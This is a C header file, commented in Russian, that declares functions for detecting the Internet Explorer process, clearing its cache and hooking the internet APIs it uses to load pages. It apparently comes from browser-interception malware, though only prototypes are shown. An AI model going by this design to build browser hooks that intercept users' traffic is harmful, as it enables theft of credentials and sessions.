#include <windows.h>
#include <wininet.h>



//*********************************************************************
//  HookInternetExplorer - функция вешает хуки на Internet Explorer 
//  Функция проверяет в каком процессе она запущена, снимает старые 
//  хуки, очищает кэш интернет эксплорера и вешает хуки на интернет апи
//*********************************************************************
bool HookInternetExplorer();

//*********************************************************************
//  HookInternetExplorerApi - функция вешает хуки на интернет API 
//  которые использует интернет експлорер для загрузки страниц
//*********************************************************************
bool HookInternetExplorerApi();

//*********************************************************************
//  IEClearCache - Функция очищает кэш интернет експлорера
//*********************************************************************
//void IEClearCache();

//*********************************************************************
//  IsInternetExplorer функция возвращает истину если данный процес
//  является процессом интернет эксплорера
//*********************************************************************
bool WINAPI IsInternetExplorer();